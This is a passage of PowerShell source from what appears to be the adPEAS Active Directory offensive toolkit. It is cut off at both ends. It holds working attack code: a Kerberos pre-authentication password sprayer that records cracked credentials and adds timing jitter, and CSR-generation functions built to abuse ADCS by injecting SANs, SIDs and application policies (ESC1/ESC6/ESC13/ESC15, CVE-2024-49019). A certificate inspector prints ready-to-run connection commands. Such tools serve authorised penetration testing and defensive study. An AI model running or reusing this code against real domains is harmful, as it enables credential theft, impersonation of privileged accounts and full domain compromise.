
                if ($result.Success) {
                    $successCount++
                    $credInfo = [PSCustomObject]@{
                        Username  = $cleanUsername
                        Password  = $pass
                        Domain    = $targetDomain
                        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                        Method    = "Kerberos Pre-Auth"
                    }
                    $successfulCreds += $credInfo

                    Write-Host "[+] SUCCESS: ${cleanUsername}@${targetDomain}:${pass}" -ForegroundColor Green

                    # Export to file if specified
                    if ($OutputFile) {
                        "${cleanUsername}:${pass}" | Out-File -FilePath $OutputFile -Append -Encoding ASCII
                    }

                    if ($StopOnSuccess) {
                        Write-Host "[*] Stopping on first success (StopOnSuccess flag set)" -ForegroundColor Yellow
                        break
                    }
                } else {
                    Write-Verbose "[!] FAILED: ${cleanUsername}@${Domain}:${pass} - $($result.Error)"
                }

                # Apply delay with optional jitter
                if ($Delay -gt 0 -and $attemptNum -lt $usernames.Count) {
                    $actualDelay = $Delay
                    if ($Jitter -gt 0) {
                        $jitterAmount = [int]($Delay * ($Jitter / 100.0))
                        $actualDelay = $Delay + (Get-Random -Minimum (-$jitterAmount) -Maximum $jitterAmount)
                    }
                    Start-Sleep -Milliseconds $actualDelay
                }
            }

            if ($StopOnSuccess -and $successCount -gt 0) {
                break
            }
        }
    }

    end {
        $endTime = Get-Date
        $duration = ($endTime - $startTime).TotalSeconds

        Write-Host ""
        Write-Host "============================================================" -ForegroundColor Cyan
        Write-Host "  Password Spray Summary" -ForegroundColor Cyan
        Write-Host "============================================================" -ForegroundColor Cyan
        Write-Host "  Total Attempts:    $totalAttempts"
        Write-Host "  Successful:        $successCount" -ForegroundColor $(if ($successCount -gt 0) { "Green" } else { "Gray" })
        Write-Host "  Failed:            $($totalAttempts - $successCount)"
        Write-Host "  Duration:          $([math]::Round($duration, 2)) seconds"
        Write-Host "  Rate:              $([math]::Round($totalAttempts / $duration, 2)) attempts/sec"
        if ($OutputFile -and $successCount -gt 0) {
            Write-Host "  Output File:       $OutputFile" -ForegroundColor Green
        }
        Write-Host "============================================================" -ForegroundColor Cyan

        return $successfulCreds
    }
}



# ----- Get-CertificateInfo.ps1 -----

function Get-CertificateInfo {
<#
.SYNOPSIS
    Displays detailed information about a certificate file (PFX/P12/CER/PEM).

.DESCRIPTION
    Parses a certificate file and displays all relevant information on the console
    without importing it into the Windows Certificate Store. Supports PFX/P12 (with
    private key), CER/DER (public only), and PEM formats.

    Shows: Subject, Issuer, Serial Number, Thumbprint, Validity, Key Information,
    Extended Key Usage, Subject Alternative Name, Template, and PKINIT assessment
    with Connect-adPEAS usage hints.

.PARAMETER Certificate
    Path to the certificate file or Base64-encoded certificate data.

.PARAMETER CertificatePassword
    Password for PFX/P12 files. Accepts String or SecureString. Default: empty string.

.PARAMETER PassThru
    Return a PSCustomObject with all parsed certificate properties instead of console output.

.EXAMPLE
    Get-CertificateInfo -Certificate ".\admin.pfx" -CertificatePassword "pass"
    Displays all certificate information for a password-protected PFX file.

.EXAMPLE
    Get-CertificateInfo -Certificate ".\server.cer"
    Displays certificate information for a DER/CER public certificate (no password needed).

.EXAMPLE
    $info = Get-CertificateInfo -Certificate ".\admin.pfx" -PassThru
    $info.Subject
    $info.PKINITCapable
    Returns a PSCustomObject with all parsed certificate properties for programmatic use.
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [string]$Certificate,

        [Parameter(Mandatory=$false)]
        $CertificatePassword = "",

        [Parameter(Mandatory=$false)]
        [switch]$PassThru
    )

    process {
        $FunctionPrefix = "[Get-CertificateInfo]"
        $cert = $null

        try {
            # --- Password handling (SecureString / String) ---
            if ($CertificatePassword -is [System.Security.SecureString]) {
                $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($CertificatePassword)
                try {
                    $PlainCertPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
                }
                finally {
                    [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
                }
            }
            elseif ($CertificatePassword -is [string]) {
                $PlainCertPassword = $CertificatePassword
            }
            else {
                Write-Warning "[!] CertificatePassword must be either String or SecureString."
                return $null
            }

            # --- Load certificate via ConvertFrom-Base64OrFile ---
            Write-Log "$FunctionPrefix Loading certificate: $Certificate"
            $certResult = ConvertFrom-Base64OrFile -InputValue $Certificate -ExpectedFormat "Certificate" -ParameterName "Certificate"

            if (-not $certResult.Success) {
                Write-Warning "[!] Failed to load certificate: $($certResult.Error)"
                return $null
            }

            Write-Log "$FunctionPrefix Certificate loaded from $($certResult.Source): $($certResult.Data.Length) bytes ($($certResult.Format))"

            # --- Create X509Certificate2 ---
            # Note: Must use -ArgumentList with explicit [byte[]] cast to prevent PowerShell
            # from unwrapping the byte array into individual constructor arguments
            $certBytes = [byte[]]$certResult.Data

            # Strategy: Try passwordless first for CER/DER (no private key), then with password for PFX
            $certLoaded = $false

            # Try passwordless loading first (works for CER/DER/PEM public certs)
            if ([string]::IsNullOrEmpty($PlainCertPassword)) {
                try {
                    $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList @(,$certBytes)
                    $certLoaded = $true
                }
                catch {
                    Write-Log "$FunctionPrefix Passwordless load failed, trying with empty password as PFX..."
                }
            }

            # Try with password (for PFX/P12 files)
            if (-not $certLoaded) {
                $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList @(
                    $certBytes,
                    $PlainCertPassword,
                    [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
                )
            }
        }
        catch {
            # HResult-based error classification (same pattern as Connect-adPEAS)
            $errorHResult = $_.Exception.HResult
            $errorMsg = $_.Exception.Message

            Write-Log "$FunctionPrefix Certificate load error - HResult: 0x$($errorHResult.ToString('X8')), Message: $errorMsg"

            switch ($errorHResult) {
                0x80070056 {  # ERROR_INVALID_PASSWORD
                    Write-Warning "[!] Incorrect certificate password."
                }
                { $_ -in @(0x80092009, 0x8009310B) } {  # CRYPT_E_NO_MATCH, CRYPT_E_ASN1_BADTAG
                    Write-Warning "[!] Invalid certificate format (not a valid PFX/P12 file)."
                }
                0x80092002 {  # CRYPT_E_BAD_ENCODE
                    Write-Warning "[!] Invalid certificate encoding - ensure the file is PFX/P12 format (not DER, PEM or CER)."
                }
                0x80090016 {  # NTE_BAD_KEYSET
                    Write-Warning "[!] Keyset does not exist - the PFX private key could not be imported."
                }
                { $_ -in @(0x80070002, 0x80070003) } {  # FILE_NOT_FOUND, PATH_NOT_FOUND
                    Write-Warning "[!] Certificate file not found."
                }
                default {
                    if ($errorMsg -match "network password is not correct") {
                        Write-Warning "[!] Incorrect certificate password."
                    } elseif ($errorMsg -match "Cannot find the requested object") {
                        Write-Warning "[!] Certificate file not found or invalid format."
                    } elseif ($errorMsg -match "ASN1 bad tag value") {
                        Write-Warning "[!] Invalid certificate format (not a valid PFX/P12 file)."
                    } else {
                        Write-Warning "[!] Failed to load certificate: $errorMsg"
                    }
                }
            }
            return $null
        }

        try {
            # === Parse all certificate data ===

            # --- Key Algorithm ---
            $keyAlgo = "Unknown"
            try {
                $pubKey = $cert.PublicKey.Key
                if ($pubKey -is [System.Security.Cryptography.RSACryptoServiceProvider] -or $pubKey -is [System.Security.Cryptography.RSACng]) {
                    $keyAlgo = "RSA ($($pubKey.KeySize) bit)"
                }
                elseif ($pubKey -is [System.Security.Cryptography.ECDsaCng] -or $pubKey -is [System.Security.Cryptography.ECDsa]) {
                    $keyAlgo = "ECDSA ($($pubKey.KeySize) bit)"
                }
                else {
                    $keyAlgo = "$($cert.PublicKey.Oid.FriendlyName) ($($pubKey.KeySize) bit)"
                }
            }
            catch {
                $keyAlgo = $cert.PublicKey.Oid.FriendlyName
                if (-not $keyAlgo) { $keyAlgo = "Unknown" }
            }

            # --- Validity Status ---
            $now = [DateTime]::Now
            if ($cert.NotBefore -gt $now) {
                $daysUntilValid = [math]::Ceiling(($cert.NotBefore - $now).TotalDays)
                $validityStatus = "Not yet valid (starts in $daysUntilValid days)"
                $validityClass = "Hint"
            }
            elseif ($cert.NotAfter -lt $now) {
                $daysExpired = [math]::Ceiling(($now - $cert.NotAfter).TotalDays)
                $validityStatus = "EXPIRED ($daysExpired days ago)"
                $validityClass = "Finding"
            }
            else {
                $daysRemaining = [math]::Ceiling(($cert.NotAfter - $now).TotalDays)
                $validityStatus = "Valid (expires in $daysRemaining days)"
                $validityClass = "Note"
            }

            # --- Extended Key Usage ---
            $ekuExt = $cert.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.37' }
            $ekuNames = @()
            if ($ekuExt) {
                $ekuTyped = [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension]$ekuExt
                foreach ($eku in $ekuTyped.EnhancedKeyUsages) {
                    $ekuNames += ConvertFrom-OID -OID $eku.Value -IncludeOID
                }
            }

            # --- Subject Alternative Name ---
            $sanExt = $cert.Extensions | Where-Object { $_.Oid.Value -eq '2.5.29.17' }
            $sanEntries = @()
            if ($sanExt) {
                $sanFormatted = $sanExt.Format($true)
                foreach ($sanLine in ($sanFormatted -split "`r`n|`n" | Where-Object { $_.Trim() })) {
                    $sanEntries += $sanLine.Trim()
                }
            }

            # --- Certificate Template ---
            $templateNameExt = $cert.Extensions | Where-Object { $_.Oid.Value -eq '1.3.6.1.4.1.311.20.2' }
            $templateInfoExt = $cert.Extensions | Where-Object { $_.Oid.Value -eq '1.3.6.1.4.1.311.21.7' }
            $templateName = if ($templateNameExt) { $templateNameExt.Format($false) } else { $null }
            $templateInfo = if ($templateInfoExt) { $templateInfoExt.Format($false) } else { $null }

            # V2-only templates: extract OID from TemplateInfo as fallback for TemplateName
            if (-not $templateName -and $templateInfo -match "Template=([0-9.]+)") {
                $templateName = $Matches[1]
            }

            # --- PKINIT Assessment ---
            $isPKINITCapable = $false
            $pkInitEKUs = @()
            $identities = @()

            if ($ekuExt) {
                $isPKINITCapable = Test-CertificatePKINITCapable -Certificate $cert
                if ($isPKINITCapable) {
                    $pkInitEKUs = @(Get-PKINITCapableEKUNames -Certificate $cert)

                    # Extract identities from SAN (same logic as Connect-adPEAS)
                    if ($sanExt) {
                        $san = $sanExt.Format($false)

                        # Collect UPNs
                        $upnMatches = [regex]::Matches($san, "Principal Name[=:]([^,\r\n]+)")
                        foreach ($m in $upnMatches) {
                            $upnValue = $m.Groups[1].Value.Trim()
                            if ($upnValue -match "^([^@]+)@") {
                                $identities += [PSCustomObject]@{ Type = "UPN"; Value = $upnValue; CName = $Matches[1] }
                            }
                        }

                        # Collect DNS names
                        $dnsMatches = [regex]::Matches($san, "DNS Name=([^,\r\n]+)")
                        foreach ($m in $dnsMatches) {
                            $dnsValue = $m.Groups[1].Value.Trim()
                            $hostPart = ($dnsValue -split '\.')[0]
                            $identities += [PSCustomObject]@{ Type = "DNS"; Value = $dnsValue; CName = "$hostPart`$" }
                        }

                        # CN fallback if no SAN identities
                        if ($identities.Count -eq 0 -and $cert.Subject -match "CN=([^,]+)") {
                            $cnValue = $Matches[1]
                            if ($cnValue -match "^([^.]+)\.(.+\..+)$") {
                                $identities += [PSCustomObject]@{ Type = "CN"; Value = $cnValue; CName = "$($Matches[1])`$" }
                            } else {
                                $identities += [PSCustomObject]@{ Type = "CN"; Value = $cnValue; CName = $cnValue }
                            }
                        }
                    }
                }
            }

            # === PassThru: return PSCustomObject ===
            if ($PassThru) {
                return [PSCustomObject]@{
                    Subject            = $cert.Subject
                    Issuer             = $cert.Issuer
                    SerialNumber       = $cert.SerialNumber
                    Thumbprint         = $cert.Thumbprint
                    NotBefore          = $cert.NotBefore
                    NotAfter           = $cert.NotAfter
                    Status             = $validityStatus
                    HasPrivateKey      = $cert.HasPrivateKey
                    KeyAlgorithm       = $keyAlgo
                    SignatureAlgorithm = $cert.SignatureAlgorithm.FriendlyName
                    EKU                = $ekuNames
                    SAN                = $sanEntries
                    TemplateName       = $templateName
                    TemplateInfo       = $templateInfo
                    PKINITCapable      = $isPKINITCapable
                    PKINITEKUs         = $pkInitEKUs
                    Identities         = $identities
                }
            }

            # === Console Output ===
            Show-SubHeader "Certificate Information"

            # --- General ---
            Show-Line "General:" -Class Hint
            Show-KeyValue "Subject:" $cert.Subject
            Show-KeyValue "Issuer:" $cert.Issuer
            Show-KeyValue "Serial Number:" $cert.SerialNumber
            Show-KeyValue "Thumbprint:" $cert.Thumbprint
            Show-EmptyLine

            # --- Validity ---
            Show-Line "Validity:" -Class Hint
            Show-KeyValue "Not Before:" $cert.NotBefore.ToString("yyyy-MM-dd HH:mm:ss")
            Show-KeyValue "Not After:" $cert.NotAfter.ToString("yyyy-MM-dd HH:mm:ss")
            Show-KeyValue "Status:" $validityStatus -Class $validityClass
            Show-EmptyLine

            # --- Key Information ---
            Show-Line "Key Information:" -Class Hint
            Show-KeyValue "Has Private Key:" $cert.HasPrivateKey.ToString()
            Show-KeyValue "Key Algorithm:" $keyAlgo
            Show-KeyValue "Signature Algorithm:" $cert.SignatureAlgorithm.FriendlyName
            Show-EmptyLine

            # --- Extended Key Usage ---
            if ($ekuNames.Count -gt 0) {
                Show-Line "Extended Key Usage:" -Class Hint
                $idx = 1
                foreach ($ekuName in $ekuNames) {
                    Show-KeyValue "[$idx]:" $ekuName
                    $idx++
                }
                Show-EmptyLine
            }

            # --- Subject Alternative Name ---
            if ($sanEntries.Count -gt 0) {
                Show-Line "Subject Alternative Name:" -Class Hint
                $idx = 1
                foreach ($entry in $sanEntries) {
                    Show-KeyValue "[$idx]:" $entry
                    $idx++
                }
                Show-EmptyLine
            }

            # --- Certificate Template ---
            if ($templateName -or $templateInfo) {
                Show-Line "Certificate Template:" -Class Hint
                if ($templateName) {
                    Show-KeyValue "Template Name:" $templateName
                }
                if ($templateInfo) {
                    Show-KeyValue "Template Info:" $templateInfo
                }
                Show-EmptyLine
            }

            # --- PKINIT Assessment ---
            if ($ekuExt) {
                Show-Line "PKINIT Assessment:" -Class Hint

                if ($isPKINITCapable) {
                    Show-KeyValue "PKINIT Capable:" "True" -Class Note
                    if ($pkInitEKUs.Count -gt 0) {
                        Show-KeyValue "PKINIT EKUs:" ($pkInitEKUs -join ", ")
                    }
                }
                else {
                    Show-KeyValue "PKINIT Capable:" "False" -Class Hint
                    Show-KeyValue "Reason:" "No PKINIT-capable EKU (Client Authentication, Smartcard Logon, or PKINIT Client Auth)"
                }

                if ($identities.Count -gt 0) {
                    Show-EmptyLine
                    Show-Line "Identities:" -Class Hint
                    $idx = 1
                    foreach ($id in $identities) {
                        Show-KeyValue "[$idx] $($id.Type):" $id.Value
                        $idx++
                    }

                    # Usage hints
                    Show-EmptyLine
                    Show-Line "Usage:" -Class Hint

                    $certPathHint = $Certificate
                    if ($certPathHint.Length -gt 60) {
                        $certPathHint = "cert.pfx"
                    }

                    if ($identities.Count -eq 1) {
                        Show-Line "Connect-adPEAS -Domain <domain> -Certificate '$certPathHint'"
                    }
                    else {
                        Show-Line "Connect-adPEAS -Domain <domain> -Certificate '$certPathHint'"
                        for ($i = 1; $i -lt $identities.Count; $i++) {
                            $id = $identities[$i]
                            $usernameHint = if ($id.Type -eq "UPN") { ($id.Value -split '@')[0] } else { ($id.Value -split '\.')[0] }
                            Show-Line "Connect-adPEAS -Domain <domain> -Certificate '$certPathHint' -Username $usernameHint"
                        }
                    }
                }
                Show-EmptyLine
            }
        }
        finally {
            if ($cert) {
                $cert.Dispose()
            }
        }
    }
}



# ----- Request-ADCSCertificate.ps1 -----

#region ===== PKCS#10 CSR GENERATION =====

<#
.SYNOPSIS
    Generates a PKCS#10 Certificate Signing Request using ASN.1 DER encoding.
#>
function New-PKCS10Request {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$SubjectDN,

        [string[]]$AlternativeNames,

        [string]$SID,

        [string[]]$ApplicationPolicies,

        [ValidateSet(1024, 2048, 4096)]
        [int]$KeyLength = 2048
    )

    $FunctionPrefix = "[New-PKCS10Request]"

    # Generate RSA key pair
    Write-Log "$FunctionPrefix Generating $KeyLength-bit RSA key pair (Subject='$SubjectDN', SANs=$($AlternativeNames.Count), SID=$(if ($SID) { 'yes' } else { 'no' }), AppPolicies=$($ApplicationPolicies.Count))"
    $rsa = [System.Security.Cryptography.RSA]::Create($KeyLength)

    try {
        # === 1. Build Subject DN as ASN.1 RDNSequence ===
        $subjectBytes = ConvertTo-ASN1Subject -SubjectDN $SubjectDN

        # === 2. Build SubjectPublicKeyInfo ===
        $rsaParams = $rsa.ExportParameters($false)

        # RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }
        $modulusInt = New-ASN1Integer -Value ([byte[]](@(0x00) + $rsaParams.Modulus))
        $exponentInt = New-ASN1Integer -Value $rsaParams.Exponent
        $rsaPublicKey = New-ASN1Sequence -Data ([byte[]]($modulusInt + $exponentInt))

        # AlgorithmIdentifier for rsaEncryption (1.2.840.113549.1.1.1)
        $rsaOID = New-ASN1ObjectIdentifier -OID "1.2.840.113549.1.1.1"
        $algNull = New-ASN1Null
        $algorithmId = New-ASN1Sequence -Data ([byte[]]($rsaOID + $algNull))

        # SubjectPublicKeyInfo ::= SEQUENCE { algorithm, subjectPublicKey BIT STRING }
        $pubKeyBitString = New-ASN1BitString -Value $rsaPublicKey
        $subjectPKInfo = New-ASN1Sequence -Data ([byte[]]($algorithmId + $pubKeyBitString))

        # === 3. Build Attributes [0] ===
        # Collect all requested X.509 extensions, then wrap them in a single
        # extensionRequest attribute (RFC 2985). Supported extensions:
        #   - Subject Alternative Name (2.5.29.17)            via -AlternativeNames
        #   - NTDS CA Security Extension (1.3.6.1.4.1.311.25.2) via -SID
        $attributesContent = [byte[]]@()
        $extensionBlobs = [System.Collections.Generic.List[byte]]::new()
        $extensionCount = 0

        # Assemble the SAN GeneralNames. The SID is embedded BOTH as a SAN URL
        # (tag:microsoft.com,2022-09-14:sid:<SID>) and as the dedicated NTDS CA
        # Security Extension below - this mirrors Certipy. CAs that honour requester
        # SANs (ESC1/ESC6) copy the SAN URL into the issued certificate even when they
        # ignore the requester-supplied NTDS extension, so the SAN URL is the reliable
        # carrier for strong mapping.
        $sanNames = @()
        if ($AlternativeNames -and $AlternativeNames.Count -gt 0) {
            $sanNames += $AlternativeNames
        }
        if ($SID) {
            $sanNames += "URL:tag:microsoft.com,2022-09-14:sid:$SID"
        }

        if ($sanNames.Count -gt 0) {
            $sanExtension = New-SANExtension -AlternativeNames $sanNames
            if ($sanExtension) {
                $extensionBlobs.AddRange([byte[]]$sanExtension)
                $extensionCount++
                Write-Log "$FunctionPrefix Added Subject Alternative Name extension ($($sanNames.Count) name(s)): $($sanNames -join ', ')"
            }
            else {
                Write-Log "$FunctionPrefix SAN extension requested but produced no GeneralNames - skipping"
            }
        }

        if ($SID) {
            # Dedicated NTDS CA Security Extension for strong mapping on DCs running
            # StrongCertificateBindingEnforcement (KB5014754, mandatory since Feb 2025).
            $sidExtension = New-NTDSCASecurityExtension -SID $SID
            if ($sidExtension) {
                $extensionBlobs.AddRange([byte[]]$sidExtension)
                $extensionCount++
                Write-Log "$FunctionPrefix Added NTDS CA Security (SID) extension: $SID"
            }
            else {
                Write-Log "$FunctionPrefix SID extension requested but could not be built for '$SID' - skipping" -Level Warning
            }
        }

        if ($ApplicationPolicies -and $ApplicationPolicies.Count -gt 0) {
            # ESC13/ESC15: inject Microsoft Application Policies (szOID_APPLICATION_CERT_POLICIES).
            # On schema-v1 templates (CVE-2024-49019/EKUwu) these are not sanitised, so
            # arbitrary EKUs (e.g. Client Authentication, Certificate Request Agent) can
            # be requested even when the template does not list them.
            $apExtension = New-ApplicationPoliciesExtension -PolicyOIDs $ApplicationPolicies
            if ($apExtension) {
                $extensionBlobs.AddRange([byte[]]$apExtension)
                $extensionCount++
                Write-Log "$FunctionPrefix Added Application Policies extension ($($ApplicationPolicies.Count) requested)"
            }
            else {
                Write-Log "$FunctionPrefix Application Policies requested but none could be resolved - skipping" -Level Warning
            }
        }

        if ($extensionCount -gt 0) {
            # Extensions ::= SEQUENCE OF Extension
            $extensionsSeq = New-ASN1Sequence -Data ($extensionBlobs.ToArray())

            # extensionRequest attribute: OID 1.2.840.113549.1.9.14 + SET { Extensions }
            $extReqOID = New-ASN1ObjectIdentifier -OID "1.2.840.113549.1.9.14"
            $extReqValues = New-ASN1Set -Data $extensionsSeq
            $extReqAttr = New-ASN1Sequence -Data ([byte[]]($extReqOID + $extReqValues))
            $attributesContent = $extReqAttr
            Write-Log "$FunctionPrefix Built extensionRequest attribute with $extensionCount extension(s)"
        }
        else {
            Write-Log "$FunctionPrefix No extensions requested - CSR has empty attribute set"
        }

        # [0] IMPLICIT constructed context tag
        $attributesTag = [byte]0xA0
        $attributesLenBytes = New-ASN1Length -Length $attributesContent.Length
        $attributes = [byte[]](@($attributesTag) + $attributesLenBytes + $attributesContent)

        # === 4. Build CertificationRequestInfo ===
        $versionInt = New-ASN1Integer -Value 0
        $certReqInfo = New-ASN1Sequence -Data ([byte[]]($versionInt + $subjectBytes + $subjectPKInfo + $attributes))

        # === 5. Sign CertificationRequestInfo ===
        # sha256WithRSAEncryption (1.2.840.113549.1.1.11)
        $sigAlgOID = New-ASN1ObjectIdentifier -OID "1.2.840.113549.1.1.11"
        $sigAlgNull = New-ASN1Null
        $sigAlgorithm = New-ASN1Sequence -Data ([byte[]]($sigAlgOID + $sigAlgNull))

        # Sign with PKCS#1 v1.5
        $signature = $rsa.SignData($certReqInfo, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
        $sigBitString = New-ASN1BitString -Value $signature

        # === 6. Build CertificationRequest ===
        $certRequest = New-ASN1Sequence -Data ([byte[]]($certReqInfo + $sigAlgorithm + $sigBitString))

        # Convert to Base64 (PEM-style, single line for certsrv)
        $csrBase64 = [Convert]::ToBase64String($certRequest)

        Write-Log "$FunctionPrefix CSR generated: $($certRequest.Length) bytes, Subject: $SubjectDN"

        return @{
            CSRBytes  = $certRequest
            CSRBase64 = $csrBase64
            RSAKey    = $rsa
        }
    }
    catch {
        if ($rsa) { $rsa.Dispose() }
        throw
    }
}

<#
.SYNOPSIS
    Converts a Subject DN string to ASN.1 DER encoded RDNSequence.
#>
function ConvertTo-ASN1Subject {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$SubjectDN
    )

    # Well-known attribute type OIDs
    $attrOIDs = @{
        'CN'  = '2.5.4.3'
        'O'   = '2.5.4.10'
        'OU'  = '2.5.4.11'
        'C'   = '2.5.4.6'
        'ST'  = '2.5.4.8'
        'L'   = '2.5.4.7'
        'DC'  = '0.9.2342.19200300.100.1.25'
        'E'   = '1.2.840.113549.1.9.1'
    }

    # Parse DN components (simple parser for CN=...,O=...,DC=... format)
    $rdnSets = [System.Collections.Generic.List[byte[]]]::new()

    # Split on comma but not within escaped commas
    $parts = [regex]::Split($SubjectDN, ',(?=\s*(?:CN|O|OU|C|ST|L|DC|E)\s*=)', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)

    foreach ($part in $parts) {
        $part = $part.Trim()
        if (-not $part) { continue }

        $eqIdx = $part.IndexOf('=')
        if ($eqIdx -lt 0) { continue }

        $attrType = $part.Substring(0, $eqIdx).Trim().ToUpper()
        $attrValue = $part.Substring($eqIdx + 1).Trim()

        if (-not $attrOIDs.ContainsKey($attrType)) {
            Write-Log "[ConvertTo-ASN1Subject] Unknown attribute type: $attrType, skipping"
            continue
        }

        $oid = New-ASN1ObjectIdentifier -OID $attrOIDs[$attrType]

        # Use PrintableString for most, IA5String for DC and E
        if ($attrType -eq 'DC' -or $attrType -eq 'E') {
            $value = New-ASN1IA5String -Value $attrValue
        }
        elseif ($attrType -eq 'C') {
            # Country must be PrintableString
            $value = New-ASN1PrintableString -Value $attrValue
        }
        else {
            $value = New-ASN1UTF8String -Value $attrValue
        }

        # AttributeTypeAndValue ::= SEQUENCE { type OID, value ANY }
        $atv = New-ASN1Sequence -Data ([byte[]]($oid + $value))

        # RelativeDistinguishedName ::= SET OF AttributeTypeAndValue
        $rdn = New-ASN1Set -Data $atv

        $rdnSets.Add($rdn)
    }

    if ($rdnSets.Count -eq 0) {
        throw "Failed to parse Subject DN: $SubjectDN"
    }

    # Name ::= SEQUENCE OF RelativeDistinguishedName
    $allRDNs = [byte[]]@()
    foreach ($rdn in $rdnSets) {
        $allRDNs = [byte[]]($allRDNs + $rdn)
    }

    return New-ASN1Sequence -Data $allRDNs
}

<#
.SYNOPSIS
    Builds a Subject Alternative Name extension for PKCS#10 CSR attributes.
#>
function New-SANExtension {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string[]]$AlternativeNames
    )

    $generalNames = [byte[]]@()

    foreach ($san in $AlternativeNames) {
        $colonIdx = $san.IndexOf(':')
        if ($colonIdx -lt 0) {
            Write-Warning "[New-SANExtension] Invalid SAN format '$san', expected 'TYPE:value'. Skipping."
            continue
        }

        $sanType = $san.Substring(0, $colonIdx).Trim().ToUpper()
        $sanValue = $san.Substring($colonIdx + 1).Trim()

        switch ($sanType) {
            'UPN' {
                # otherName [0] { OID(1.3.6.1.4.1.311.20.2.3), [0] UTF8String }
                $upnOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.20.2.3"
                $upnUTF8 = New-ASN1UTF8String -Value $sanValue

                # Explicit context tag [0] around UTF8String
                $ctx0Inner = [byte[]](@(0xA0) + (New-ASN1Length -Length $upnUTF8.Length) + $upnUTF8)

                # otherName content = OID + [0] value
                $otherNameContent = [byte[]]($upnOID + $ctx0Inner)

                # GeneralName [0] IMPLICIT (otherName)
                $otherNameTag = [byte]0xA0
                $otherNameLen = New-ASN1Length -Length $otherNameContent.Length
                $generalNames += [byte[]](@($otherNameTag) + $otherNameLen + $otherNameContent)
            }
            'DNS' {
                # dNSName [2] IA5String
                $dnsBytes = [System.Text.Encoding]::ASCII.GetBytes($sanValue)
                $dnsTag = [byte]0x82  # Context [2] IMPLICIT
                $dnsLen = New-ASN1Length -Length $dnsBytes.Length
                $generalNames += [byte[]](@($dnsTag) + $dnsLen + $dnsBytes)
            }
            'URL' {
                # uniformResourceIdentifier [6] IA5String
                # Used for the SID-in-SAN form: tag:microsoft.com,2022-09-14:sid:<SID>
                $urlBytes = [System.Text.Encoding]::ASCII.GetBytes($sanValue)
                $urlTag = [byte]0x86  # Context [6] IMPLICIT
                $urlLen = New-ASN1Length -Length $urlBytes.Length
                $generalNames += [byte[]](@($urlTag) + $urlLen + $urlBytes)
            }
            default {
                Write-Warning "[New-SANExtension] Unsupported SAN type '$sanType'. Supported: UPN, DNS, URL."
            }
        }
    }

    if ($generalNames.Length -eq 0) {
        return $null
    }

    # GeneralNames ::= SEQUENCE OF GeneralName
    $generalNamesSeq = New-ASN1Sequence -Data $generalNames

    # Extension ::= SEQUENCE { extnID OID, critical BOOLEAN (optional), extnValue OCTET STRING }
    $sanOID = New-ASN1ObjectIdentifier -OID "2.5.29.17"
    $sanOctet = New-ASN1OctetString -Value $generalNamesSeq

    return [byte[]](New-ASN1Sequence -Data ([byte[]]($sanOID + $sanOctet)))
}

<#
.SYNOPSIS
    Builds the NTDS CA Security Extension (szOID_NTDS_CA_SECURITY_EXT) carrying an
    object SID for strong certificate mapping.
.DESCRIPTION
    Encodes the requested principal's SID into the certificate so that domain
    controllers enforcing StrongCertificateBindingEnforcement (KB5014754) map the
    certificate to that principal. The structure mirrors what the CA itself emits:

        Extension ::= SEQUENCE {
            extnID    OBJECT IDENTIFIER (1.3.6.1.4.1.311.25.2),
            extnValue OCTET STRING wrapping
                SEQUENCE OF GeneralName {
                    [0] otherName {
                        type-id OBJECT IDENTIFIER (1.3.6.1.4.1.311.25.2.1),
                        value   [0] EXPLICIT OCTET STRING (SID string, ASCII)
                    }
                }
        }

    The SID is carried in its string form (e.g. "S-1-5-21-...-500") as required by
    szOID_NTDS_OBJECTSID.
#>
function New-NTDSCASecurityExtension {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$SID
    )

    $FunctionPrefix = "[New-NTDSCASecurityExtension]"

    if ($SID -notmatch '^S-1-\d+(-\d+)+$') {
        Write-Warning "$FunctionPrefix '$SID' is not a valid SID string (expected S-1-5-21-...). Skipping SID extension."
        return $null
    }

    # otherName value: [0] EXPLICIT OCTET STRING (SID string as ASCII)
    $sidBytes = [System.Text.Encoding]::ASCII.GetBytes($SID)
    $sidOctet = New-ASN1OctetString -Value $sidBytes
    $ctx0Value = [byte[]](@(0xA0) + (New-ASN1Length -Length $sidOctet.Length) + $sidOctet)

    # otherName content: type-id OID (szOID_NTDS_OBJECTSID) + [0] value
    $objectSidOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.25.2.1"
    $otherNameContent = [byte[]]($objectSidOID + $ctx0Value)

    # GeneralName [0] IMPLICIT (otherName)
    $otherName = [byte[]](@(0xA0) + (New-ASN1Length -Length $otherNameContent.Length) + $otherNameContent)

    # GeneralNames ::= SEQUENCE OF GeneralName
    $generalNamesSeq = New-ASN1Sequence -Data $otherName

    # Extension ::= SEQUENCE { extnID, extnValue OCTET STRING }
    $extOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.25.2"
    $extnValue = New-ASN1OctetString -Value $generalNamesSeq

    Write-Log "$FunctionPrefix Encoded NTDS CA Security Extension for SID $SID"
    return [byte[]](New-ASN1Sequence -Data ([byte[]]($extOID + $extnValue)))
}

<#
.SYNOPSIS
    Builds the Microsoft Application Policies extension (szOID_APPLICATION_CERT_POLICIES,
    1.3.6.1.4.1.311.21.10) for ESC13/ESC15 (EKUwu / CVE-2024-49019).
.DESCRIPTION
    Encodes a CertificatePolicies value (SEQUENCE OF PolicyInformation, each just a
